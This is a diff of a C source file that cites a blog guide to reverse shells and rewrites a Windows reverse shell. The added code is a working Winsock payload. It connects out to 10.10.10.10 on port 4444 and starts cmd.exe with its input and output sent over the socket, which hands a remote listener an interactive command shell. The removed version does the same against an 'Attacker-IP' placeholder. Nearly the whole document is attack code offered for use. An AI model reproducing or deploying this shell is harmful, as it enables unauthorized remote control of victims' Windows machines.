@@ -1,43 +1,43 @@
 // https://www.zerodetection.net/blog/a-simple-guide-to-creating-a-reverse-shell-in-c
 
-#include <stdio.h>
-#include <stdlib.h>
 #include <winsock2.h>
-#include <windows.h>
+#include <stdio.h>
+#pragma comment(lib,"ws2_32")
 
-int main() {
-    // Initialize Winsock
-    WSADATA wsData;
-    WSAStartup(MAKEWORD(2,2), &wsData);
+WSADATA wsaData;
+SOCKET Winsock;
+struct sockaddr_in hax; 
+char ip_addr[16] = "10.10.10.10"; 
+char port[6] = "4444";            
 
-    // Create socket
-    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sockfd == INVALID_SOCKET) {
-        printf("Socket creation failed\n");
-        return 1;
-    }
+STARTUPINFO ini_processo;
 
-    // Server details
-    struct sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(4444); // Port
-    serverAddr.sin_addr.s_addr = inet_addr("Attacker-IP");
+PROCESS_INFORMATION processo_info;
 
-    // Connect to attacker
-    if (connect(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) != 0) {
-        printf("Connection failed\n");
-        closesocket(sockfd);
-        WSACleanup();
-        return 1;
-    }
+int main()
+{
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
-    // Redirect input, output, and error
-    dup2((int)sockfd, 0);
-    dup2((int)sockfd, 1);
-    dup2((int)sockfd, 2);
 
-    // Execute shell
-    system("cmd.exe");
+    struct hostent *host; 
+    host = gethostbyname(ip_addr);
+    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));
+
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(atoi(port));
+    hax.sin_addr.s_addr = inet_addr(ip_addr);
+
+    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+    memset(&ini_processo, 0, sizeof(ini_processo));
+    ini_processo.cb = sizeof(ini_processo);
+    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
+    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+
+    TCHAR cmd[255] = TEXT("cmd.exe");
+
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
 
     return 0;
 }
